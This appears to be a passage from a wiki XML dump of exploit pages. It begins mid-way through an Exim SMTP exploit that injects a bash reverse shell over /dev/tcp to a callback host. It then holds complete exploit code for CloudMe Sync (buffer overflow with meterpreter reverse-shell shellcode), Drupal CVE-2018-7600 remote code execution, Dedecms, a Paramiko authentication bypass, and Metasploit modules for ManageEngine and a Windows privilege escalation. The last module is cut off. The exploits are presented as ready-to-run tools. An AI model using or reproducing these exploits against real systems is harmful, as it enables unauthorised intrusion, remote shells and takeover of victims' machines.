0x3d: [0,247],
0x3e: [0,251],
0x3f: [0,254],
0x40: [64,3],
0x41: [64,7],
0x42: [64,11],
0x43: [64,15],
0x44: [64,19],
0x45: [64,23],
0x46: [64,27],
0x47: [64,31],
0x48: [64,35],
0x49: [64,39],
0x4a: [64,43],
0x4b: [64,47],
0x4c: [64,51],
0x4d: [64,55],
0x4e: [64,59],
0x4f: [64,63],
0x50: [64,67],
0x51: [64,71],
0x52: [64,75],
0x53: [64,79],
0x54: [64,83],
0x55: [64,87],
0x56: [64,91],
0x57: [64,95],
0x58: [64,99],
0x59: [64,103],
0x5a: [64,107],
0x5b: [64,111],
0x5c: [64,115],
0x5d: [64,119],
0x5e: [64,123],
0x5f: [64,127],
0x60: [64,131],
0x61: [64,135],
0x62: [64,139],
0x63: [64,143],
0x64: [64,147],
0x65: [64,151],
0x66: [64,155],
0x67: [64,159],
0x68: [64,163],
0x69: [64,167],
0x6a: [64,171],
0x6b: [64,175],
0x6c: [64,179],
0x6d: [64,183],
0x6e: [64,187],
0x6f: [64,191],
0x70: [64,195],
0x71: [64,199],
0x72: [64,203],
0x73: [64,207],
0x74: [64,211],
0x75: [64,215],
0x76: [64,219],
0x77: [64,223],
0x78: [64,227],
0x79: [64,231],
0x7a: [64,235],
0x7b: [64,239],
0x7c: [64,243],
0x7d: [64,247],
0x7e: [64,251],
0x7f: [64,254],
0x80: [128,3],
0x81: [128,7],
0x82: [128,11],
0x83: [128,15],
0x84: [128,19],
0x85: [128,23],
0x86: [128,27],
0x87: [128,31],
0x88: [128,35],
0x89: [128,39],
0x8a: [128,43],
0x8b: [128,47],
0x8c: [128,51],
0x8d: [128,55],
0x8e: [128,59],
0x8f: [128,63],
0x90: [128,67],
0x91: [128,71],
0x92: [128,75],
0x93: [128,79],
0x94: [128,83],
0x95: [128,87],
0x96: [128,91],
0x97: [128,95],
0x98: [128,99],
0x99: [128,103],
0x9a: [128,107],
0x9b: [128,111],
0x9c: [128,115],
0x9d: [128,119],
0x9e: [128,123],
0x9f: [128,127],
0xa0: [128,131],
0xa1: [128,135],
0xa2: [128,139],
0xa3: [128,143],
0xa4: [128,147],
0xa5: [128,151],
0xa6: [128,155],
0xa7: [128,159],
0xa8: [128,163],
0xa9: [128,167],
0xaa: [128,171],
0xab: [128,175],
0xac: [128,179],
0xad: [128,183],
0xae: [128,187],
0xaf: [128,191],
0xb0: [128,195],
0xb1: [128,199],
0xb2: [128,203],
0xb3: [128,207],
0xb4: [128,211],
0xb5: [128,215],
0xb6: [128,219],
0xb7: [128,223],
0xb8: [128,227],
0xb9: [128,231],
0xba: [128,235],
0xbb: [128,239],
0xbc: [128,243],
0xbd: [128,247],
0xbe: [128,251],
0xbf: [128,254],
0xc0: [192,3],
0xc1: [192,7],
0xc2: [192,11],
0xc3: [192,15],
0xc4: [192,19],
0xc5: [192,23],
0xc6: [192,27],
0xc7: [192,31],
0xc8: [192,35],
0xc9: [192,39],
0xca: [192,43],
0xcb: [192,47],
0xcc: [192,51],
0xcd: [192,55],
0xce: [192,59],
0xcf: [192,63],
0xd0: [192,67],
0xd1: [192,71],
0xd2: [192,75],
0xd3: [192,79],
0xd4: [192,83],
0xd5: [192,87],
0xd6: [192,91],
0xd7: [192,95],
0xd8: [192,99],
0xd9: [192,103],
0xda: [192,107],
0xdb: [192,111],
0xdc: [192,115],
0xdd: [192,119],
0xde: [192,123],
0xdf: [192,127],
0xe0: [192,131],
0xe1: [192,135],
0xe2: [192,139],
0xe3: [192,143],
0xe4: [192,147],
0xe5: [192,151],
0xe6: [192,155],
0xe7: [192,159],
0xe8: [192,163],
0xe9: [192,167],
0xea: [192,171],
0xeb: [192,175],
0xec: [192,179],
0xed: [192,183],
0xee: [192,187],
0xef: [192,191],
0xf0: [192,195],
0xf1: [192,199],
0xf2: [192,203],
0xf3: [192,207],
0xf4: [192,211],
0xf5: [192,215],
0xf6: [192,219],
0xf7: [192,223],
0xf8: [192,227],
0xf9: [192,231],
0xfa: [192,235],
0xfb: [192,239],
0xfc: [192,243],
0xfd: [192,247],
0xfe: [192,251],
0xff: [192,254],
}
 
def exploit(b1, b2, b3, rcpt_index, target, cb, cbport):
   global s
   global f
 
   #if c % 0x50 == 0:
   # print " byte1=0x%02x byte2=0x%02x byte3=0x%02x rcpt_index=0x%02x" % (b1, b2, b3, rcpt_index)
   
   try:
    connect(target, 25)
   except:
    raise Exception("CONNECTION ERROR")
   
   banner = f.readline()
   if test:
    print banner.strip("\r").strip("\n")
 
   ehlo("A" * 8000)
   
   ehlo("B" * 16)
   
   unrec("\xff" * 2000)
   ehlo("D" * bufsize)
   one_byte_overwrite()
    
   fake_header  = p(0)
   fake_header += p(0x1f51)
   res = auth_plain1("E" * 176 + fake_header + "E" * (bufsize-176-len(fake_header)))
   
   res = ehlo("F" * 16)
   if res == "":
    raise Exception("CRASHED")
   
   unrec("\xff" * 2000)
   unrec("\xff" * 2000)
 
   fake_header  = p(0x4110)
   fake_header += p(0x1f50)
   auth_plain("G" * 176 + fake_header + "G" * (bufsize-176-len(fake_header)))
   
   auth_plain2('A'* (bufsize) + p(0x2021) + chr(b1) + chr(b2) + chr(lookup_table[b3][0]), lookup_table[b3][1])
   res = ehlo("I" * 16)
      
   if res == "":
    s.close()
    f.close()
    raise Exception("EHLO(I)")
 
   acl_smtp_rcpt_offset = rcpt_index
   local_host = cb
   local_port = cbport
   cmd = "/usr/bin/setsid /bin/bash -c \"/bin/bash --rcfile &lt;(echo 'echo " + "0x%02x " % b1 + "0x%02x " % b2 + "0x%02x " % b3 + "0x%04x " % rcpt_index + "') -i &gt;&amp; /dev/tcp/" + local_host + "/" + str(local_port) + " 0&gt;&amp;1\""
   cmd_expansion_string = "${run{" + cmd + "}}\0"
 
   auth_plain("J" * acl_smtp_rcpt_offset + cmd_expansion_string + "\x00")# * (bufsize - acl_smtp_rcpt_offset - len(cmd_expansion_string)))
 
   write("MAIL FROM:&lt;postmaster@localhost&gt;")
 
   res = f.readline()
 
   if res != "":
    if test:
     raise Exception("NO TARGET")
    raise Exception("OFFSET")
 
   raise Exception("BYTE")
 
   write("RCPT TO:&lt;postmaster@localhost&gt;")  
   readuntil("Accepted")
    
   write("RCPT TO:&lt;postmaster@localhost&gt;")
   if f.readline() == "":
    s.close()
    f.close()
    raise Exception("RCPT TO")
 
def checkvuln(host):
 try:
  exploit(0xff, 0xff, 0xff, rcpt_index_start, host, "127.0.0.1", "1337")
 except Exception as e:
  print e
  if str(e) == "EHLO(I)":
   return True
 return False
 
def _exploit(b1, b2, b3, rcpt_index, target, cb, cbport, q):
 if b1 &gt; 0xff or b2 &gt; 0xff or b3 &gt; 0xff:
  q.put([b1,b2,b3,"VALUE"])
  return
 try:
  exploit(b1, b2, b3, rcpt_index, target, cb, cbport)
 except Exception as e:
  e = str(e)
  if e == "[Errno 104] Connection reset by peer" or e.find("EOF occurred") &gt; -1:
    e = "BYTE"
  q.put([b1,b2,b3,e])
  
if __name__ == '__main__':
 if len(sys.argv) &lt; 4:
  print "%s &lt;cb&gt; &lt;cbport&gt; &lt;target&gt;" % sys.argv[0]
  sys.exit(1)
  
 target = sys.argv[3]
 cb = sys.argv[1]
 cbport = sys.argv[2]
 
 if len(sys.argv) == 8:
  print "reuse fixed offsets"
  b1 = int(sys.argv[4], 16)
  b2 = int(sys.argv[5], 16)
  b3 = int(sys.argv[6], 16)
  rcpt_index = int(sys.argv[7], 16)
 
  try:
    exploit(b1, b2, b3, rcpt_index, target, cb, cbport)
  except Exception as e:
    print e
  sys.exit(1)
 
 print "check vuln"
 if not checkvuln(target):
  print "false"
  sys.exit(1)
 
 print "true"
 test=False
 
 allbytes = [offset for offset in xrange(0, 0x110)]
 allbytes_10 = [offset for offset in xrange(0x10, 0x110, 0x10)]
 b3_survived = []
 
 b3_survived_stop = False
 tested = []
 try:
   q = Queue()
   procs = []
   print
   print "Discover first byte in offset"
   print
   sys.stdout.write("Try Offsets %02x%02x%02x to %02x%02x%02x ..." % (0x00,0xff,0xff,0xff,0xff,0xff))
   for b3 in allbytes:
     if b3 % 0x10 == 0 and b3 &lt;= 0xff:
      sys.stdout.write("\rTry Offsets %02x%02x%02x to %02x%02x%02x ..." % (b3,0xff,0xff,0xff,0xff,0xff))
     
     b1 = 0x00
     
     for b2 in allbytes_10:
      proc = Process(target=_exploit, args=(b1, b2, b3, rcpt_index_start, target, cb, cbport, q))
      procs.append(proc)
      proc.daemon = True
      proc.start()
     
      to_break = False
      if len(procs) == 16:
       for i in xrange(0,16):
         result = q.get()
         if result[3] == "BYTE":
           if [b3, b2] not in tested:
            tested.append([b3, b2])
            b3_survived.append(result[2])
            sys.stdout.write("\nOffset %02x%02x%02x Survived ..." % (result[2],result[1],result[0]))
           else:
            to_break = True
       
       procs[:] = []
       if to_break:
        break
   
   print "\n"
   print "Discover offsets for rcpt index brute force ..."
   print
   b1_survived = {}
   for b3 in b3_survived:
    for b2 in allbytes:
     if b2 % 0x10 == 0 and b2 &lt;= 0xff:
      sys.stdout.write("\r\r\nTry Offsets %02x%02x%02x to %02x%02x%02x ... " % (b3,b2,0x00,b3,0xff,0xf0))
     for b1 in allbytes_10:
       proc = Process(target=_exploit, args=(b1, b2, b3, rcpt_index_start, target, cb, cbport, q))
       procs.append(proc)
       proc.daemon = True
       proc.start()
 
       if len(procs) == 16:
        for i in xrange(0,16):
          result = q.get()
          if result[3] == "OFFSET":
           if result[2] not in b1_survived:
             b1_survived[result[2]] = []
           b1_survived[result[2]].append(result)
           sys.stdout.write("\n%02x%02x%02x Survived ..." % (result[2],result[1],result[0]))
            
        procs[:] = []
   
   iteration_list = [n for n in xrange(0x100,0x1000,0x10)]
   iteration_list2 = [n for n in xrange(0x1000,0x3000,0x100)]
 
   for n in iteration_list2:
        iteration_list.append(n)
 
   b1_survived_priority = []
   b1_survived_additional = []
 
   for key in sorted(b1_survived):
    if len(b1_survived[key]) &lt; 7:
      b1_survived_priority.append(b1_survived[key])
    else:
      b1_survived_additional.append(b1_survived[key])
 
   _b1_survived = []
   for result in b1_survived_priority:
    _b1_survived.append(result)
   for result in b1_survived_additional:
    _b1_survived.append(result)
 
   print "\n"
   print "Start rcpt index brute force ..."
   print
 
   for result in _b1_survived:
    for s in result:
     sys.stdout.write("\rTry Offset %02x%02x%02x with rcpt index from 0x100 to 0x3000 ..." % (s[2],s[1],s[0]))
     for rcpt_index in iteration_list:
       proc = Process(target=_exploit, args=(s[0], s[1], s[2], rcpt_index, target, cb, cbport, q))
       procs.append(proc)
       proc.daemon = True
       proc.start()
 
       if len(procs) == 16:
        for i in xrange(0,16):
         q.get()
 
        procs[:] = []
 except KeyboardInterrupt:
  pass
 
 print "done."
&lt;/pre&gt;</text>
      <sha1>1l1s0xipoc3dlz40mfer339r6uudgyx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-6892 CloudMe Sync 1.9.2 遠程緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1224</id>
    <revision>
      <id>1529</id>
      <timestamp>2021-04-11T02:07:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python # CloudMe Sync 1.9.2 Remote Exploit # Written by r00tpgp @ http://www.r00tpgp.com # Usage: python CloudMe-1.9.2-Exploit.py &lt;victim-ip&gt; &lt;port&gt; #..."</comment>
      <origin>1529</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3222" sha1="2jtdt7bwxu2tqtfmcxwew4k2tbs3w37" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python
# CloudMe Sync 1.9.2 Remote Exploit
# Written by r00tpgp @ http://www.r00tpgp.com
# Usage: python CloudMe-1.9.2-Exploit.py &lt;victim-ip&gt; &lt;port&gt;
# Spawns reverse meterpreter LHOST=192.168.0.68 LPORT=1990
# CVE: CVE-2018-6892
# CloudMe Installer: https://org.cloudme.com/en/sync
# Tested on Windows 7 32b SP1

import sys, socket, time
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
 
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b '"\x00\x0a\x0d'
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 10 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 360 (iteration=0)
# x86/shikata_ga_nai chosen with final size 360
# Payload size: 360 bytes
# Final size of python file: 1730 bytes
buf =  ""
buf += "\xbd\xb6\xb3\x2c\xc1\xdb\xdd\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x54\x83\xe8\xfc\x31\x68\x0f\x03\x68\xb9\x51"
buf += "\xd9\x3d\x2d\x17\x22\xbe\xad\x78\xaa\x5b\x9c\xb8\xc8"
buf += "\x28\x8e\x08\x9a\x7d\x22\xe2\xce\x95\xb1\x86\xc6\x9a"
buf += "\x72\x2c\x31\x94\x83\x1d\x01\xb7\x07\x5c\x56\x17\x36"
buf += "\xaf\xab\x56\x7f\xd2\x46\x0a\x28\x98\xf5\xbb\x5d\xd4"
buf += "\xc5\x30\x2d\xf8\x4d\xa4\xe5\xfb\x7c\x7b\x7e\xa2\x5e"
buf += "\x7d\x53\xde\xd6\x65\xb0\xdb\xa1\x1e\x02\x97\x33\xf7"
buf += "\x5b\x58\x9f\x36\x54\xab\xe1\x7f\x52\x54\x94\x89\xa1"
buf += "\xe9\xaf\x4d\xd8\x35\x25\x56\x7a\xbd\x9d\xb2\x7b\x12"
buf += "\x7b\x30\x77\xdf\x0f\x1e\x9b\xde\xdc\x14\xa7\x6b\xe3"
buf += "\xfa\x2e\x2f\xc0\xde\x6b\xeb\x69\x46\xd1\x5a\x95\x98"
buf += "\xba\x03\x33\xd2\x56\x57\x4e\xb9\x3e\x94\x63\x42\xbe"
buf += "\xb2\xf4\x31\x8c\x1d\xaf\xdd\xbc\xd6\x69\x19\xc3\xcc"
buf += "\xce\xb5\x3a\xef\x2e\x9f\xf8\xbb\x7e\xb7\x29\xc4\x14"
buf += "\x47\xd6\x11\x80\x4d\x40\x5a\xfd\x52\x32\x32\xfc\x52"
buf += "\x35\x05\x89\xb5\x69\xd9\xda\x69\xc9\x89\x9a\xd9\xa1"
buf += "\xc3\x14\x05\xd1\xeb\xfe\x2e\x7b\x04\x57\x06\x13\xbd"
buf += "\xf2\xdc\x82\x42\x29\x99\x84\xc9\xd8\x5d\x4a\x3a\xa8"
buf += "\x4d\xba\x5b\x52\x8e\x3a\xf6\x52\xe4\x3e\x50\x04\x90"
buf += "\x3c\x85\x62\x3f\xbf\xe0\xf0\x38\x3f\x75\xc1\x33\x09"
buf += "\xe3\x6d\x2c\x75\xe3\x6d\xac\x23\x69\x6e\xc4\x93\xc9"
buf += "\x3d\xf1\xdc\xc7\x51\xaa\x48\xe8\x03\x1e\xdb\x80\xa9"
buf += "\x79\x2b\x0f\x51\xac\x28\x48\xad\x32\x0c\xf1\xc6\xcc"
buf += "\x10\x01\x17\xa7\x90\x51\x7f\x3c\xbf\x5e\x4f\xbd\x6a"
buf += "\x37\xc7\x34\xfa\xf5\x76\x48\xd7\x58\x27\x49\xdb\x40"
buf += "\x3e\xc4\x1c\x77\x3f\x26\x21\xa1\x06\x5c\x62\x71\x3d"
buf += "\x6f\xd9\xd4\x14\xfa\x21\x4a\x66\x2f";

# Return Address for Windows 7 32b SP1
ret = '\x25\xDF\xB8\x68'

# NOP Padding
nop = '\x90'*20
 
# EIP Writing Pattern
pattern = "A"*1036 + ret + nop + buf # Our exploit together. Junk -&amp;gt; Return Address -&amp;gt; NOPS -&amp;gt; Shellcode
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.send(pattern) # Send the user command with a variable length name
client.close() # Close the Connection

&lt;/pre&gt;</text>
      <sha1>2jtdt7bwxu2tqtfmcxwew4k2tbs3w37</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-7600 Drupal遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2305</id>
    <revision>
      <id>2741</id>
      <timestamp>2021-05-08T09:01:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== DRUPAL 7 &lt;= 7.57   ==EXP== &lt;pre&gt; #!/usr/bin/env python3  import requests import argparse from bs4 import BeautifulSoup  def get_args():   parser = argparse.Ar..."</comment>
      <origin>2741</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2945" sha1="ssflkk9n6gk3pkyl1b1ewy70dqacyt6" xml:space="preserve">==影響版本==
DRUPAL 7 &lt;= 7.57


==EXP==
&lt;pre&gt;
#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog="drupa7-CVE-2018-7600.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57
                    by poisoning the recover password form (user/password) and triggering it with
                    the upload file via ajax (/file/ajax).
                    ''')
  parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
  parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
  parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
  parser.add_argument("-p", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
  args = parser.parse_args()
  return args

def pwn_target(target, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  proxies = {'http': proxy, 'https': proxy}
  print('[*] Poisoning a form and including it in cache.')
  get_params = {'q':'user/password', 'name[#post_render][]':function, 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        print('[*] Poisoned form ID: ' + form_build_id)
        print('[*] Triggering exploit to execute: ' + command)
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise

def main():
  print ()
  print ('=============================================================================')
  print ('|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |')
  print ('|                              by pimps                                     |')
  print ('=============================================================================\n')

  args = get_args() # get the cl args
  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
&lt;/pre&gt;</text>
      <sha1>ssflkk9n6gk3pkyl1b1ewy70dqacyt6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-7700 Dedecms V5.7後台任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>1115</id>
    <revision>
      <id>1400</id>
      <timestamp>2021-04-10T02:32:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; http://localhost/后台地址/tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field} &lt;/pre&gt;"</comment>
      <origin>1400</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="155" sha1="b7br4k48mmg7u3zyqtv6o4s1saqx8ji" xml:space="preserve">==POC==
&lt;pre&gt;
http://localhost/后台地址/tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field}
&lt;/pre&gt;</text>
      <sha1>b7br4k48mmg7u3zyqtv6o4s1saqx8ji</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-7750 Paramiko 2.4.1 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1201</id>
    <revision>
      <id>1505</id>
      <timestamp>2021-04-11T01:20:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Paramiko 2.4.1 - Authentication Bypass # Date: 2018-10-27 # Exploit Author: Adam Brown # Vendor Homepage: https://www.paramiko.org # Software Li..."</comment>
      <origin>1505</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1154" sha1="n6awpat8d4bxmvq329rj06coezo0mal" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Paramiko 2.4.1 - Authentication Bypass
# Date: 2018-10-27
# Exploit Author: Adam Brown
# Vendor Homepage: https://www.paramiko.org
# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2
# Version: &lt; 1.17.6, 1.18.x &lt; 1.18.5, 2.0.x &lt; 2.0.8, 2.1.x &lt; 2.1.5, 2.2.x &lt; 2.2.3, 2.3.x &lt; 2.3.2, and 2.4.x &lt; 2.4.1
# Tested on: Multiple
# CVE : CVE-2018-7750
 
# This PoC is based on discussions found at the following github issue:
# https://github.com/paramiko/paramiko/issues/1175
# TLDR, Paramiko doesn't check if the client has completed the authentication step
# before allowing the client to open channels. The PoC below connects to an SFTP
# server, and lists the root directory without authenticating. Slight modification
# is required if you want to open an SSH channel.
 
#!/usr/bin/python
import paramiko
 
host = '127.0.0.1'
port = 22
 
trans = paramiko.Transport((host, port))
trans.start_client()
 
# If the call below is skipped, no username or password is required.
# trans.auth_password('username', 'password')
 
sftp = paramiko.SFTPClient.from_transport(trans)
print(sftp.listdir('/'))
sftp.close()
&lt;/pre&gt;</text>
      <sha1>n6awpat8d4bxmvq329rj06coezo0mal</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-7890 ManageEngine Application Manager 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1222</id>
    <revision>
      <id>1527</id>
      <timestamp>2021-04-11T02:05:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSFEXP== &lt;pre&gt; ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModu..."</comment>
      <origin>1527</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3591" sha1="mviv412fyreexmksil14vn5x4m7tvby" xml:space="preserve">==MSFEXP==
&lt;pre&gt;
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; "ManageEngine Applications Manager Remote Code Execution",
      'Description'    =&gt; %q(
        This module exploits command injection vulnerability in the ManageEngine Application Manager product.
        An unauthenticated user can execute a operating system command under the context of privileged user.

        Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials
        by accessing given system. This endpoint calls a several internal classes and then executes powershell script
        without validating user supplied parameter when the given system is OfficeSharePointServer.
      ),
      'License'        =&gt; MSF_LICENSE,
      'Author'         =&gt;
        [
          'Mehmet Ince &lt;mehmet@mehmetince.net&gt;' # author &amp; msf module
        ],
      'References'     =&gt;
        [
          ['CVE', '2018-7890'],
          ['BID', '103358'],
          ['URL', 'https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/'],
          ['URL', 'https://pitstop.manageengine.com/portal/community/topic/security-vulnerability-issues-fixed-upgrade-to-the-latest-version-of-applications-manager']
        ],
      'DefaultOptions' =&gt;
        {
          'WfsDelay' =&gt; 10,
          'RPORT' =&gt; 9090
        },
      'Payload' =&gt;
        {
          'BadChars' =&gt; "\x22"
        },
      'Platform'       =&gt; ['win'],
      'Arch'           =&gt; [ARCH_X86, ARCH_X64],
      'Targets'        =&gt; [['Automatic', {}]],
      'Privileged'     =&gt; true,
      'DisclosureDate' =&gt; 'Mar 7 2018',
      'DefaultTarget'  =&gt; 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the application', '/'])
      ]
    )
  end

  def check
    res = trigger_endpoint(Rex::Text.rand_text_alpha(3))
    if res &amp;&amp; res.body.include?('Kindly check the credentials and try again')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') unless check == Exploit::CheckCode::Vulnerable

    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)

    print_status('Triggering the vulnerability')

    trigger_endpoint("$(#{p})")
  end

  def trigger_endpoint(username)
    send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'testCredential.do'),
      'vars_post' =&gt; {
        'method' =&gt; 'testCredentialForConfMonitors',
        'type' =&gt; 'OfficeSharePointServer',
        'montype' =&gt; 'OfficeSharePointServer',
        'isAgentEnabled' =&gt; 'NO',
        'isAgentAssociated' =&gt; 'false',
        'displayname' =&gt; Rex::Text.rand_text_alpha(rand(10..15)),
        'HostName' =&gt; '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        'Powershell' =&gt; 'True', # :-)
        'CredSSP' =&gt; 'False',
        'SPType' =&gt; 'SPServer',
        'CredentialDetails' =&gt; 'nocm',
        'Password' =&gt; Rex::Text.rand_text_alpha(3),
        'UserName' =&gt; username
      }
    )
  end
end

&lt;/pre&gt;</text>
      <sha1>mviv412fyreexmksil14vn5x4m7tvby</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-8897 Microsoft Windows POP / MOV SS本地特權提升漏洞</title>
    <ns>0</ns>
    <id>547</id>
    <revision>
      <id>753</id>
      <timestamp>2021-03-29T14:27:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core/post..."</comment>
      <origin>753</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5995" sha1="5u2l4a9e276yh19sw2oawidhffoqseb" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class MetasploitModule &lt; Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; 'Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability',
      'Description'    =&gt; %q{
        This module exploits a vulnerability in a statement in the system programming guide
        of the Intel 64 and IA-32 architectures software developer's manual being mishandled
        in various operating system kerneles, resulting in unexpected behavior for #DB
        excpetions that are deferred by MOV SS or POP SS.

        This module will upload the pre-compiled exploit and use it to execute the final
        payload in order to gain remote code execution.
      },
      'License'        =&gt; MSF_LICENSE,
      'Author'         =&gt;
        [
          'Nick Peterson',        # Original discovery (@nickeverdox)
          'Nemanja Mulasmajic',   # Original discovery (@0xNemi)
          'Can BAPlA1/4k &lt;can1357&gt;',  # PoC
          'bwatters-r7'           # msf module
        ],
      'Platform'       =&gt; [ 'win' ],
      'SessionTypes'   =&gt; [ 'meterpreter' ],
      'Targets'        =&gt;
        [
          [ 'Windows x64', { 'Arch' =&gt; ARCH_X64 } ]
        ],
      'DefaultTarget'  =&gt; 0,
      'DisclosureDate' =&gt; 'May 08 2018',
      'References'     =&gt;
        [
          ['CVE', '2018-8897'],
          ['EDB', '44697'],
          ['BID', '104071'],
          ['URL', 'https://github.com/can1357/CVE-2018-8897/'],
          ['URL', 'https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/']
        ],
      'DefaultOptions' =&gt;
        {
          'DisablePayloadHandler' =&gt; 'False'
        }
    ))

    register_options([
      OptString.new('EXPLOIT_NAME',
        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
      OptString.new('PAYLOAD_NAME',
        [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),
      OptString.new('PATH',
        [false, 'Path to write binaries (%TEMP% by default).', nil]),
      OptInt.new('EXECUTE_DELAY',
        [false, 'The number of seconds to delay before executing the exploit', 3])
    ])
  end

  def setup
    super
    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
    @payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
    @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
    @payload_name = "#{payload_name}.exe" unless payload_name.match(/\.exe$/i)
    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
    @payload_path = "#{temp_path}\\#{payload_name}"
    @exploit_path = "#{temp_path}\\#{exploit_name}"
    @payload_exe = generate_payload_exe
  end

  def validate_active_host
    begin
      host = session.session_host
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
